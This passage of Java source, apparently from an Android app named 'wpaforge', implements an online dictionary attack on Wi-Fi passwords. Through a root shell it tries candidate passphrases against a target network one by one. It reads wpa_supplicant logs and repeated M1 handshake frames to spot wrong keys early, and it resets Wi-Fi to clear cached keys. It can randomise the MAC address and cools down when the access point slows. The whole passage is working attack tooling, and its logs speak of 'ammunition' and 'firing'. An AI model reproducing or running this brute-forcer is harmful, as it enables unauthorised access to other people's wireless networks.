                        // （留给「那条 M1 只是丢包重传、密码其实正确」的余地）。
                        // 谓词 m1SilentImpliesWrongKey / EARLY_FAIL_SILENCE_MS 保留，
                        // 单测用它们表达「为什么不能单独用」。
                        if (tM1Ms < 0) tM1Ms = SystemClock.uptimeMillis() - t0;
                    }

                    // ── 早期失败：M1 被重发（2026-10-23 真机实测定论）─────────────
                    // AP 没收到有效 M2 时每 ~1.0s 重发一次 M1；看到第 2 次 M1
                    // 就已经确定密码错，不必再等 `Handshake failed`（那还要多等 2~3 秒）。
                    // 归属保护：要求本次见过「目标 SSID 的关联行」，避免把
                    // 系统回连**别的**网络时产生的 M1 算到这条候选头上。
                    int m1Count = m1CountForTarget;
                    boolean successSeen = WpaLogReader.sawNegotiatedFor(wlogSlice, target.bssid);
                    if (m1RetryImpliesWrongKey(m1Count, successSeen)) {
                        if (!m1RetryArmed) {
                            m1RetryArmed = true;
                            m1RetryArmedAt = SystemClock.uptimeMillis();
                        } else if (SystemClock.uptimeMillis() - m1RetryArmedAt >= 120L) {
                            long ms = SystemClock.uptimeMillis() - t0;
                            android.util.Log.i(TAG, "早期失败: M1 重发 " + m1Count
                                    + " 次（握手无进展）");
                            return new Attempt(password, Verdict.AUTH_FAIL, ms,
                                    L.s("M1 被重发（握手无进展）→ 密码错误",
                                        "M1 retransmitted (no handshake progress) -> wrong passphrase")
                                            + timing(tAssocMs, tM1Ms, tAuthMs),
                                    "m1retry");
                        }
                    }

                    if (logWinUsable
                            && (WpaLogReader.sawWrongKeyFor(wlogSlice, target.ssid)
                                    || (tried && (WpaLogReader.sawHandshakeFailure(wlogSlice)
                                            || WpaLogReader.sawAssocReject(wlogSlice))))) {
                        long ms = SystemClock.uptimeMillis() - t0;
                        android.util.Log.i(TAG, "快速失败(日志): 握手失败/关联被拒");
                        return new Attempt(password, Verdict.AUTH_FAIL, ms,
                                L.s("日志显示握手失败（密码错误）",
                                    "log shows handshake failure (wrong passphrase)"),
                                "wpalog");
                    }
                }
            }
        }

        long total = SystemClock.uptimeMillis() - t0;

        // R6：循环里一次日志都没读到（例如通道不吐日志）时也要留下窗口状态，
        // 不能让「没读到日志」和「没采集元数据」在记录里长得一样。
        if (lastWindow == null) {
            lastWindow = AttemptMarker.evaluate(attemptId, clearRes.ok(), markerWritten, null);
        }

        // 超时后的归类
        boolean currentOnTarget = target.ssid.equals(snapshotSsid());
        if (currentOnTarget) {
            long nowId = currentNetId();
            if (nowId >= 0 && netIdBefore >= 0 && nowId == netIdBefore) {
                // 还是命令前那条连接 —— 不能算本次命中
                currentOnTarget = false;
            }
        }
        // R3：归类走纯函数（可离线逐格穷举），失败/未知/无结论三类严格分开。
        //   · not-attempted  → ERROR（命令没生效，**不是**密码错）
        //   · 各类「证据不足」 → UNKNOWN
        //   · 到期且无证据    → TIMEOUT（观察窗口结束，没有明确结论）
        // 旧实现在最后一种情形返回 AUTH_FAIL —— 那是把「没有成功证据」当成
        // 「失败已被证明」，是本次修复的核心根因之一。
        DeadlineOutcome out = classifyDeadline(
                targetNetId < 0 && !sawAttempt && channelAlive,          // 命令未生效
                currentOnTarget,
                suspectNetIdConflict,
                !sawAttempt && !channelAlive,                            // 通道无响应
                !sawAttempt && channelAlive && lastStatusSsid != null
                        && target.ssid.equals(lastStatusSsid));

        String detail;
        if ("not-attempted".equals(out.reason)) {
            // 「命令根本没生效」先摘出来：过了 4 轮（>400ms）框架都没给这个 SSID
            // 建出配置，说明 connect-network 被悄悄丢掉了（它在忙时就是这样，
            // 连输出都没有）。这条**不能当密码错** —— 真机表现为「对着正确的密码
            // 跳过去」（2026-10-24 实报）。归到通道异常，用户能看出是环境问题。
            detail = L.s("连接命令似乎未生效：框架没有为本条候选建出配置"
                            + "（通道忙时 cmd wifi 会静默丢弃请求）。换个 AP 或稍后重试。",
                    "the connect command did not take effect: the framework created no "
                            + "config for this candidate (cmd wifi drops requests silently "
                            + "when busy). Try another AP, or retry later.");
        } else if ("on-target-unattributed".equals(out.reason)) {
            // **不能因为「现在连着目标」就判成功**。
            //
            // 这正是那批假阳性的来源：系统回连、旧连接残留、缓存凭据……
            // 都会让这里为真，而它们跟当前这条候选没有关系。
            // 没有「本次新建立」的正面证据（新 netId / 本次日志），就只能存疑。
            detail = L.s("当前连着目标，但没有本次连接的证据（可能是原有连接或缓存凭据）",
                    "on target now, but no evidence of a fresh connection "
                            + "(possibly pre-existing or cached credentials)");
        } else if ("netid-conflict".equals(out.reason)) {
            // 出现过「目标 + COMPLETED + IP，但 netId 对不上」。
            // 不判成功（可能是同名网络的回连或残留），但也不能当作「密码错」——
            // 如实报成不确定，让用户自己复核，而不是悄悄丢掉一次可能的命中。
            detail = L.s("出现过目标已连接的状态，但与本次新建配置的 netId 不符，无法确认归因",
                    "target showed connected, but its netId differs from the one created "
                            + "by this attempt - attribution unconfirmed");
        } else if ("channel-no-response".equals(out.reason)) {
            // 既没看到尝试、通道又完全不响应 —— 是通道/命令问题，不是密码错。
            // 归 UNKNOWN，避免把正确密码误报成错误。
            detail = L.s("命令未生效（通道无响应）",
                    "command had no effect (channel unresponsive)");
        } else if ("status-unclear".equals(out.reason)) {
            // 通道活着，但结束时 status 显示连着目标却始终没判定成功 ——
            // 可能是连接太慢或状态机没给出证据，保守归 UNKNOWN。
            detail = L.s("连接状态不明（通道正常但证据不足）",
                    "inconclusive (channel ok, insufficient evidence)");
        } else {
            // R3：**不得**把「等满时限、没有可归因的失败证据」写成 AUTH_FAIL。
            // 这一条只说明「本次观察窗口结束，没有得出结论」。
            detail = L.s("观察窗口结束：未连上，且没有可归因的失败证据（这不等于密码错误）",
                    "observation window ended: not connected and no attributable failure "
                            + "evidence (this is NOT a proven wrong passphrase)");
        }
        Verdict verdict = out.verdict;

        android.util.Log.i(TAG, "tryOneShell end: " + total + "ms sawAttempt=" + sawAttempt
                + " channelAlive=" + channelAlive + " lastStatusSsid=" + lastStatusSsid
                + " currentOnTarget=" + currentOnTarget
                + " verdict=" + verdict);

        // 分层证据摘要（未命中时也给出，方便定位是哪层的问题）
        // R10：原来这里报的「事件N」恒为 0（NetworkWatcher 早就不参与判定）—— **假数字**。
        // 现在改报真正影响结论的东西：本条候选的日志窗口是否可用。
        detail = detail + L.f(" [层: 日志%d/%s · status%d/%s · 窗口%s]",
                " [layers: log%d/%s status%d/%s window:%s]",
                logRounds, logReadable ? "可读" : "不可读",
                statusRounds, channelAlive ? "通" : "断",
                lastWindow == null ? "未采集" : (lastWindow.evidenceUsable() ? "可用" : lastWindow.reason));

        Attempt fin = new Attempt(password, verdict, total, detail, "");
        fin.reason = out.reason;
        return fin;
    }

    private boolean watcherRegistered() {
        return watcher != null;
    }

    private static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }


    // ------------------------------------------------------------------ 批量交给系统

    // ------------------------------------------------------------------ 命中复核

    /** 复核结果 */
    public static final class VerifyResult {
        /** 复验是否成功复现 */
        public final boolean reproduced;
        /** 复验耗时 */
        public final long elapsedMs;
        public final String detail;
        VerifyResult(boolean reproduced, long ms, String detail) {
            this.reproduced = reproduced;
            this.elapsedMs = ms;
            this.detail = detail == null ? "" : detail;
        }
    }

    /**
     * 命中之后做一次**独立复验**。
     *
     * <p>步骤：
     * <ol>
     *   <li>断开当前连接，并确认断开了（目标保持未连 3 秒以上）</li>
     *   <li>用**同一个密码**再连一次</li>
     *   <li>只有这次也成功，才算「可复现」</li>
     * </ol>
     *
     * <p>为什么需要它：单次「连上了」无法区分两种情况 ——
     * 真是这条密码连上的，还是系统自己重连的。这两者在日志里长得一样。
     * <b>能被复现的才算数。</b>
     *
     * @param timeoutMs 复验最长等待
     */
    public VerifyResult verifyHit(NetRecord target, String security, String password, long timeoutMs) {
        long t0 = SystemClock.uptimeMillis();

        if (shell == null) {
            return new VerifyResult(false, 0,
                    L.s("没有 shell 通道，无法复验", "no shell channel; cannot verify"));
        }

        // 1. 断开 + 确认
        try { shell.exec("cmd wifi forget-network 0", 2000); } catch (Throwable ignored) {}
        boolean off = disconnectAndVerify(target.ssid);
        if (!off) {
            return new VerifyResult(false, SystemClock.uptimeMillis() - t0,
                    L.s("复验前无法断开目标，结果不可信",
                        "could not disconnect before verification; result unreliable"));
        }

        // 2. 重新渋净配置
        try { shell.forgetTarget(target.ssid); } catch (Throwable ignored) {}

        // 3. 用同一密码再连一次
        final String cmd = ConnectSpec.buildConnect(target.ssid, security, password,
                pinBssid ? target.bssid : null, macRotate);
        final ShellChannel sh = shell;
        final long commandAt0 = SystemClock.uptimeMillis();
        new Thread(() -> {
            try { sh.exec(cmd, 20000); } catch (Throwable ignored) {}
        }, "wpaforge-verify-conn").start();

        // 复验判据与主判定**保持一致**（四层，任一确认即通过）。
        //
        // 旧实现只认 NetworkWatcher 事件，而部分机型上回调拿不到 SSID，
        // 于是正确密码在主判定里明明「看起来连上了」，到复验这一步却永远失败，
        // 被降级成 UNKNOWN —— 用户看到的就是「密码对也判不出来」。
        //
        // 复验的前提是「已断开并确认断开」，此刻目标必然未连接，
        // 因此任何随后的连接证据都只能来自这次重连，归因是确定的。
        final long commandAt = commandAt0;
        final String ssidBefore = snapshotSsid();
        final long netIdBefore = currentNetId();

        // 与 tryOneShell 同样的问题（2026-10-23 一起修）：
        // 这里原本也在“缓冲刚清空”的时刻一次性探测，探测必然失败 →
        // 复验的日志判据被整段跳过。改为无条件进入，读到内容即视为可读。
        boolean logReadable = true;

        long deadline = t0 + timeoutMs;
        while (SystemClock.uptimeMillis() < deadline) {
            if (cancelFlag.get()) {
                return new VerifyResult(false, SystemClock.uptimeMillis() - t0,
                        L.s("复验被取消", "verification cancelled"));
            }
            sleep(150);

            // 判据 A：状态机日志（root）
            {
                String stateLog = WifiStateLog.read(shell, 600);
                if (stateLog != null && WifiStateLog.sawConnectedFor(stateLog, target.ssid)) {
                    long ms = SystemClock.uptimeMillis() - t0;
                    android.util.Log.i(TAG, "复验通过(状态机日志)");
                    return new VerifyResult(true, ms,
                            L.s("复验通过（用同一密码能再次连上）",
                                "verified (reconnected with the same passphrase)"));
                }
            }

            // 判据 B：status + netId（两条通道都可用）
            String st = null;
            try { st = shell.exec("cmd wifi status", 5000); } catch (Throwable ignored) {}
            if (st != null && StatusParser.connectedTo(st, target.ssid)) {
                long nowId = StatusParser.parse(st, target.ssid).netId;
                boolean newLink = !target.ssid.equals(ssidBefore)
                        || (nowId >= 0 && netIdBefore >= 0 && nowId != netIdBefore);
                if (newLink) {
                    long ms = SystemClock.uptimeMillis() - t0;
                    android.util.Log.i(TAG, "复验通过(status): netId=" + nowId);
                    return new VerifyResult(true, ms,
                            L.s("复验通过（用同一密码能再次连上）",
                                "verified (reconnected with the same passphrase)"));
                }
            }

            // 判据 C：watcher 事件
            long at = watcher != null
                    ? watcher.firstAvailableAfter(target.ssid, commandAt) : -1;
            if (at > 0) {
                long ms = SystemClock.uptimeMillis() - t0;
                android.util.Log.i(TAG, "复验通过(watcher): 事件在命令后 " + (at - commandAt) + "ms");
                return new VerifyResult(true, ms,
                        L.s("复验通过（用同一密码能再次连上）",
                            "verified (reconnected with the same passphrase)"));
            }

            // 判据 D：本地 API
            String nowSsid = snapshotSsid();
            if (target.ssid.equals(nowSsid) && !target.ssid.equals(ssidBefore)) {
                long ms = SystemClock.uptimeMillis() - t0;
                android.util.Log.i(TAG, "复验通过(WifiInfo)");
                return new VerifyResult(true, ms,
                        L.s("复验通过（用同一密码能再次连上）",
                            "verified (reconnected with the same passphrase)"));
            }
        }

        // 超时了。区分两种原因，便于排查
        boolean onTargetNow = target.ssid.equals(snapshotSsid());
        if (onTargetNow) {
            return new VerifyResult(false, SystemClock.uptimeMillis() - t0,
                    L.s("复验失败：确实连上了目标，但没收到连接证据（监听可能失效）",
                        "verification failed: on target now but no connect evidence "
                                + "(listener may be broken)"));
        }

        return new VerifyResult(false, SystemClock.uptimeMillis() - t0,
                L.s("复验失败：用同一密码没有再连上 —— 很可能是误判，或信号太差",
                    "verification failed: could not reconnect with the same passphrase "
                            + "- likely a false positive, or the signal is too weak"));
    }

    // ------------------------------------------------------------------ 批量跑

    /**
     * 跑一批候选。阻塞，放工作线程。
     *
     * @param timeoutMsPerItem 每条最长等多久；<=0 用默认
     */
    public void run(NetRecord target, List<Candidate> candidates, int startOffset,
                    long timeoutMsPerItem, Listener l) {
        CheckResult chk = check();
        if (!chk.ok) { l.onBlocked(chk.title, chk.detail); return; }
        if (target == null || target.ssid == null || target.ssid.isEmpty()) {
            l.onBlocked(L.s("目标信息不完整", "Incomplete target"),
                    L.s("没有拿到目标的 SSID。", "The target SSID is missing."));
            return;
        }
        if (candidates == null || candidates.isEmpty()) {
            l.onBlocked(L.s("候选为空", "No candidates"),
                    L.s("字典里没有可用的候选。", "The dictionary has no usable candidates."));
            return;
        }

        cancelFlag.set(false);
        pauseFlag.set(false);
        consecutiveTimeouts = 0;

        // 启动事件监听（判定只认它）
        if (watcher != null) {
            watcher.clear();
            watcher.start();
        }
        if (authWatch != null) {
            authWatch.start();
            // 把监听器状态打到 UI 上。
            // 判定完全依赖它，如果它没生效，
            // 必须能从界面看出来，而不是去翻 logcat。
            l.onLog(L.f("事件监听器: %s",
                    "event watcher: %s",
                    watcher.isRegistered()
                            ? L.s("已启用（判定可用）", "active (verdict available)")
                            : L.s("启用失败（判定不可用）", "failed to register (verdict unavailable)")));
            l.onLog(L.s("  说明: 判定主链是 `cmd wifi status` 的三条件同行，加上本候选窗口内的",
                    "  Note: the verdict rests on `cmd wifi status` (three conditions on one "
                            + "line) plus the wpa_supplicant lines inside"));
            l.onLog(L.s("  wpa_supplicant 日志。系统回调只用于诊断显示，不参与判定。",
                    "  this candidate's own log window. System callbacks are diagnostics only "
                            + "and do not decide the verdict."));
        } else {
            l.onLog(L.s("事件监听器未初始化",
                    "event watcher not initialised"));
        }

        // **跑之前先自检通道**
        //
        // 设置里显示的模式只是个数字，跟通道能不能用毫无关系。
        // 之前没有这一步，通道断了也照跑 97 条，
        // 全是「未连上」，用户以为是密码不对 —— 这就是他反复遇到的
        // 「明明密码对却识别不到」。
        ChannelProbe probe = probeChannel();
        l.onLog(L.s("── 通道自检 ──", "── channel self-check ──"));
        for (String line : probe.steps) l.onLog("  " + line);
        if (!probe.ok) {
            l.onLog(L.s("✗ 自检未通过，已停止。", "x self-check failed, stopping."));
            l.onBlocked(probe.summary, probe.detail);
            return;
        }
        l.onLog("✓ " + probe.summary);

        // **完整环境诊断** —— 把每一层能测的都测一遍并写进日志。
        //
        // 用户报障时只能看到「没连上」「跳过判定」，不知道卡在哪一层。
        // 判定链有 4 层判据 + 3 种通道，任何一层不通表现都一样。
        // 这里逐项给出结论，界面和日志文件里都有，发出来即可定位。
        try {
            EnvDiagnostics.Report diag = EnvDiagnostics.run(appCtx, mode, shell);
            for (String line : diag.text.toString().split("\n")) {
                l.onLog(line);
            }
        } catch (Throwable t) {
            l.onLog("环境诊断执行失败: " + t.getClass().getSimpleName());
        }

        // ---- 清缓存：重启一次 WiFi ----
        //
        // 为什么要这一步：WPA2 有 PMKSA 缓存（快速重连用的密钥缓存）。
        // 即便 forget 了配置，wpa_supplicant 仍可能在短时间内用缓存密钥
        // 连回同一个 AP —— 此时**用错误密码也会连上**，判定就成了假阳性。
        // 实机复现：正确密码跑成功后，紧接着用错误密码再跑，仍显示「已连上」。
        //
        // 重启 WiFi（off -> on）会强制 wpa_supplicant 重来，缓存被清掉。
        // 只在任务开始时做一次，不影响逐条速度。
        if (shell != null) {
            l.onLog(L.s("清空凭据缓存（防止缓存的旧密钥污染判定）…",
                    "Resetting Wi-Fi (clearing key cache to avoid stale-credential false positives)..."));
            try { shell.exec("cmd wifi set-wifi-enabled disabled", 8000); } catch (Throwable ignored) {}
            sleep(1500);
            try { shell.exec("cmd wifi set-wifi-enabled enabled", 8000); } catch (Throwable ignored) {}
            // 等它起来
            for (int i = 0; i < 20; i++) {
                sleep(500);
                String wprobe = null;
                try { wprobe = shell.exec("cmd wifi status", 4000); } catch (Throwable ignored) {}
                if (wprobe != null && wprobe.contains("Wifi is enabled")) break;
            }
            l.onLog(L.s("缓存已清空，信道重挂完成", "Wi-Fi reset done"));
        }

        // ---- 建立基线 ----
        //
        // **这是修「任何密码都成功」的关键一步**。
        // 如果手机本来就连着目标网络，那么第一条候选一进来就会看到
        // 「当前 SSID == 目标」—— 旧实现据此判成功，于是 12345678、
        // 00000000 全都在第一条“命中”。
        //
        // 所以必须先断开，并**确认真的断开了**，把基线清成「未连接目标」。
        // 之后任何“连上了”才是这条候选的功劳。
        String baseline = snapshotSsid();
        if (target.ssid.equals(baseline)) {
            l.onLog(L.f("锚点校正：当前仍挂在目标 %s，先行脱离…",
                    "Baseline: already connected to %s, disconnecting first...", target.ssid));
            boolean ok = disconnectAndVerify(target.ssid);
            if (ok) {
                l.onLog(L.s("✓ 锚点已固定（当前脱离目标网）",
                        "baseline cleared (not connected to target)"));
            } else {
                l.onLog(L.s("⚠ 脱离失败。",
                        "could not disconnect from the target."));
                l.onLog(L.s("  此时任何密码都会看到「已经连着目标」，",
                        "  Any passphrase would then see already-connected,"));
                l.onLog(L.s("  结果将被标记为「无法确认」而不是成功。",
                        "  and results will be marked UNKNOWN instead of success."));
            }
        } else {
            l.onLog(L.f("锚点：当前挂载 = %s（非目标，可直接开火）",
                    "Baseline: currently on %s (not the target, ready to start)",
                    baseline == null ? L.s("无", "none") : baseline));
        }

        final long perItem = timeoutMsPerItem > 0 ? timeoutMsPerItem
                : 10_000L;
        final String security = securityArg(target);
        final int total = candidates.size();
        final int start = Math.max(0, Math.min(startOffset, total));

        int tested = 0;
        int cursor = start;
        String hit = null;
        long beginAt = SystemClock.uptimeMillis();
        // 净尝试耗时：只累计每条候选从发命令到出结论的时间。
        //
        // 不用墙钟（beginAt 到结束）的原因：那段时间里还包含
        // WiFi 重置、基线断开、通道自检这些一次性开销，
        // 摊进「每条耗时」会让预估值被严重高估。
        long pureTryMs = 0L;
        /** AP 侧退避检测窗口（连续偏慢就冷却一下，别拿无效尝试硬怼） */
        final BackoffPolicy.Window backoff = new BackoffPolicy.Window();
        /** 每 20 条吐一行耗时汇总（后台跑的日志里唯一能看到快慢的地方） */
        final CostMeter costMeter = new CostMeter(20);
        /** 最近 6 条的判词 —— 没命中时写进日志，让「为什么没判出来」有据可查 */
        final java.util.ArrayDeque<String> recentVerdicts = new java.util.ArrayDeque<>();
        /** 上一行监听器诊断 —— 内容没变就不重复写，免得刷满日志 */
        String lastWatcherLine = null;

        l.onLog(L.f("引擎点火：%s 通道 · 弹药 %d 发 · 单发时限 %.1f 秒",
                "Engine: %s, %d candidates, up to %.1fs each",
                channelName(), total, perItem / 1000.0));

        // 把这一轮**实际会用到的连接参数**写出来。
        // 用户开了「锁定 AP」「更换随机 MAC」却看不到效果时，这一行就是答案：
        // 参数没带上、BSSID 形状不对、开关没生效，都能一眼看出。
        l.onLog(L.s("连接参数: ", "Connect params: ")
                + ConnectSpec.describe(target.ssid, security,
                        pinBssid ? target.bssid : null, macRotate));

        // R6：本次任务的运行标识。只含时间（36 进制）+ 目标 SSID 的哈希前 8 位，
        // 不含 SSID 明文、不含口令 —— 可以安全地写进任务日志。
        currentRunId = presetRunId != null ? presetRunId
                : AttemptId.newRunId(System.currentTimeMillis(), target.ssid, runOrdinal++);
        presetRunId = null;   // 一次预置只用一次
        l.onLog(L.s("运行标识: ", "run id: ")
                + (currentRunId == null ? "<invalid>" : currentRunId)
                + L.s("（本次任务内每条候选的判词都会带上它）",
                      " (every verdict in this run carries it)"));

        try {
            for (int i = start; i < total; i++) {
                if (cancelFlag.get() || pauseFlag.get()) break;

                Candidate c = candidates.get(i);
                tested++;
                testedCount = tested;
                cursor = i + 1;
                l.onAttemptStart(cursor, total, c.password);

                long itemT0 = SystemClock.uptimeMillis();
                // 序号 = 该候选在字典里的位置（与判词里的顺序号同源）。
                // runId 拿不到时传 null，Attempt 会显式记为无效而不是伪造一个 id。
                String aid = currentRunId == null ? null
                        : AttemptId.of(currentRunId, cursor);
                Attempt a = tryOne(target, security, c.password, perItem, aid);
                long itemMs = SystemClock.uptimeMillis() - itemT0;

                // 挂起/中断发生在这一条执行到一半 —— 它**没有**得到结论。
                // 不能把它算成「试过了」：cursor 已经推进，续跑时会静默跳过
                // 一条从未真正验证过的候选（漏判）。回退游标，下次重试它。
                if (a.verdict == Verdict.ABORTED) {
                    tested--;
                    testedCount = tested;
                    cursor = i;
                    l.onAttemptResult(a);
                    break;
                }
                pureTryMs += itemMs;
                livePureTryMs = pureTryMs;

                // 攒够 20 条写一行汇总。四段分解 + 判定归类，
                // 让「后台跑」也有实测数据可看（否则界面一关就全瞎）。
                costMeter.record(itemMs, a.verdict.name(), a.confirmedBy,
                        statPrepMs, statProbeMs, statPollMs, statLogMs, statRounds);
                // 复核补充：把本条候选的**窗口隔离状态**一并写进判词尾巴。
                // 原来 isolated 只进 detail（界面），任务日志里看不到 ——
                // 事后无法回答「这次日志通道到底可不可用、有没有被污染」。
                recentVerdicts.addLast(verdictTag(a.attemptId, cursor, c.password,
                        a.verdict, a.confirmedBy)
                        + L.s("·窗口", "·win")
                        + (a.logWindow == null ? "未采集" : a.logWindow.reason));
                while (recentVerdicts.size() > 6) recentVerdicts.removeFirst();
                String costLine = costMeter.takeSummary();
                if (costLine != null) l.onLog("  " + costLine);

                // 退避检测：**只喂「AP 给了明确结论」的尝试**（见 BackoffPolicy.countable）。
                // 等满超时是本地策略的固定值、通道异常与用户中断也都不是 AP 的响应特征 ——
                // 把它们算进样本，会让「每条都超时」被误读成「连续限流」，越退越慢。
                // 再加一道时间条件：**只有明显快于单发时限的尝试**才反映 AP 的响应速度。
                // 本机错误密码常常是「等到 8~10 秒才有失败信号」，那种耗时是
                // AP 慢 + 本地时限共同决定的，拿来当「变慢」的证据会一直自证。
                if (BackoffPolicy.countable(a.verdict) && itemMs < perItem * 7 / 10) {
                    backoff.record(itemMs);
                }
                long cool = BackoffPolicy.suggestDelayMs(backoff.recent(), backoff.count());
                if (cool > 0) {
                    l.onLog(L.f("目标响应明显变慢（连续 %d 条），冷却 %.1f 秒",
                            "target responding slowly (%d in a row), cooling %.1fs",
                            BackoffPolicy.MIN_SAMPLES, cool / 1000.0));
                    sleep(cool);
                    backoff.reset();
                }

                // 命中即命中 —— 复验只作为**附加信息**，不再一票否决。
                //
                // 为什么改：主判定用的是四层硬证据（状态机日志 / status+netId 绑定 /
                // 网络事件 / WifiInfo），其中 netId 是系统分配的、对不上就不算命中，
                // 归因已经足够严密，不需要靠「断开重连」再来一遍。
                //
                // 而「断开重连」有实际副作用：
                //   · 会打断用户当前的网络（用户明确反馈过）
                //   · 部分路由器/AP 会限制短时间内的快速重连（802.11 关联退避），
                //     于是正确密码也「复验失败」——用户看到的就是「明明连上了却说不算」。
                // 所以复验失败的结论只能说明「无法复现」，不能推翻已经确立的连接事实。
                // 命中即命中，立刻结束 —— **不再做「断开重连」式复验**。
                //
                // 为什么移除复验：
                //   · 主判定用的是四层硬证据（状态机日志 / status+netId 绑定 /
                //     网络事件 / WifiInfo），其中 netId 由系统分配，
                //     对不上就不算命中，归因已经足够严密；
                //   · 复验要「断开再连一次」，会**打断用户当前的网络**；
                //   · 部分路由器/AP 对短时间内的快速重连有退避，正确密码也会
                //     「复验失败」——用户看到的就是「明明连上了却说不算命中」。
                //   综上：收益小、副作用大、还会造成假失败，直接去掉。
                boolean reported = false;
                if (a.isSuccess()) {
                    // 明文口令**不进日志文件**（用户既定决策：明文只允许在命中卡片里
                    // 由用户主动开启）。日志里给可对照的脱敏标签（顺序号 + 哈希前 6 位）。
                    l.onLog(L.f("⚡ 密钥命中：%s（证据: %s）",
                            "candidate %s connected (via %s)",
                            io.github.wlmosv_png.wpaforge.ui.Redact.pwAt(cursor, c.password),
                            a.confirmedBy));
                    l.onAttemptResult(a);
                    hit = c.password;
                    reported = true;
                    break;
                }

                if (!reported) {
                    l.onAttemptResult(a);
                }

                // 判定失败时把事件摘要打出来。
                // 「没收到事件」和「收到事件但 SSID 对不上」是两种不同故障。
                if (watcher != null && a.verdict != Verdict.SUCCESS) {
                    int n = watcher.eventCount();
                    String wline;
                    if (n == 0) {
                        // 没有事件 —— 把监听器自己的诊断也带上。
                        // 「没注册」「注册了但系统不回调」「回调了但拿不到 SSID」
                        // 是三种完全不同的故障。
                        wline = L.s("  监听器诊断: ", "  watcher: ") + watcher.diagnose();
                    } else {
                        StringBuilder sb = new StringBuilder("  ");
                        sb.append(L.s("事件 ", "events ")).append(n).append(": ");
                        for (NetworkWatcher.Event e : watcher.recent(6)) {
                            sb.append(e.ssid).append(e.available ? "↑" : "↓").append(' ');
                        }
                        wline = sb.toString().trim();
                    }
                    // 降噪：这条诊断每轮都在打，而且内容往往一字不变。
                    // 后台跑时它曾把日志刷满，真正的信息（耗时汇总、判定归类）
                    // 一条都看不见。内容变了才写。
                    if (!wline.equals(lastWatcherLine)) {
                        lastWatcherLine = wline;
                        l.onLog(wline);
                    }
                }

                if (a.verdict == Verdict.TIMEOUT) {
                    consecutiveTimeouts++;
                    if (consecutiveTimeouts == TIMEOUT_ALERT) {
                        // 到期无结论（TIMEOUT）现在有真实生产路径：它既可能是通道问题，
                        // 也可能只是这些候选没给出可归因的证据 —— 两种都要说清楚。
                        l.onLog(L.s(
                                "连续多条「观察窗口结束、无结论」—— 可能是通道没真正生效，"
                                + "也可能是这几条没有产生可归因的证据。"
                                + "请检查授权/权限，或换一种执行方式。",
                                "Several inconclusive attempts in a row - the channel may not "
                                + "be working, or these candidates produced no attributable "
                                + "evidence. Check permissions or switch execution mode."));
                    }
                } else {
                    consecutiveTimeouts = 0;
                }


                // 用净尝试耗时算速率，界面上的「条/秒」与剩余时间
                // 才和用户实际感受到的一致。
                double elapsed = Math.max(0.001, pureTryMs / 1000.0);
                double rate = tested / elapsed;
                long eta = rate > 0 ? (long) ((total - cursor) / rate * 1000) : -1;
                l.onProgress(cursor, total, rate, eta);
            }
        } finally {
            lastPureTryMs = pureTryMs;
            if (watcher != null) watcher.stop();
            if (authWatch != null) authWatch.stop();
            // 常驻 shell 会话必须显式关掉：否则一轮任务跑完，
            // 后台会留着一个 root shell 进程。
            try { shell.close(); } catch (Throwable ignored) {}
            // 没命中时把最后几条的判词写进**文件日志**。
            // 逐条结果平时只走界面回调，文件里一条都没有 —— 于是「为什么没判出来」
            // 事后完全查不动（2026-10-24 就吃过这个亏）。这里只写一行，不破降噪。
            if (hit == null && !recentVerdicts.isEmpty()) {
                StringBuilder vb = new StringBuilder();
                for (String v2 : recentVerdicts) {
                    if (vb.length() > 0) vb.append(" · ");
                    vb.append(v2);
                }
                l.onLog("  " + L.s("最近判定: ", "recent verdicts: ") + vb);
            }
            String outcome;
            if (hit != null) outcome = "DONE_HIT";
            else if (pauseFlag.get()) outcome = "PAUSED";
            else if (cancelFlag.get()) outcome = "STOPPED";
            else outcome = "DONE_MISS";
            l.onFinished(tested, cursor, hit, outcome);
        }
    }

    /**
     * 上一轮 run() 的净尝试耗时（毫秒）。
     *
     * 只累计每条候选从发命令到出结论的时间，不含 WiFi 重置、
     * 基线断开、通道自检等一次性开销。
     * 供服务层记录实测速率 —— 用墙钟会让预估严重偏高。
     */
    private volatile long lastPureTryMs = 0L;
    /** 运行中的实时累计净尝试耗时（供界面算**本次**速率，不是历史值） */
    private volatile long livePureTryMs = 0L;

    // ── 每条候选的耗时分解（只为可观测性，**不参与任何判定**）──────────────
    // 后台跑任务时界面没开、UI 回调是空的，逐条结果不会进任务日志 ——
    // 没有这几个数就只能靠猜。20 条汇总一次，写在 run() 里。
    volatile long statPrepMs, statProbeMs, statPollMs, statLogMs;
    volatile int statRounds;
    /** 本轮已试条数（供界面算实时速率） */
    private volatile int testedCount = 0;

    public int testedCount() {
        return testedCount;
    }

    /** 上一轮净尝试耗时（毫秒）；没跑过返回 0。 */
    public long lastPureTryMs() {
        return lastPureTryMs;
    }

    public long livePureTryMs() {
        return livePureTryMs;
    }

    private String channelName() {
        return "Root";
    }

    private static String securityArg(NetRecord t) {
        switch (t.security) {
            case OPEN: return "open";
            case OWE:  return "owe";
            case WEP:  return "wep";
            case WPA3: return "wpa3";
            default:   return "wpa2";
        }
    }

    public void cancel() { cancelFlag.set(true); }
    public void pause()  { pauseFlag.set(true); }
    public void resume() { pauseFlag.set(false); }
    public boolean isPaused() { return pauseFlag.get(); }
}
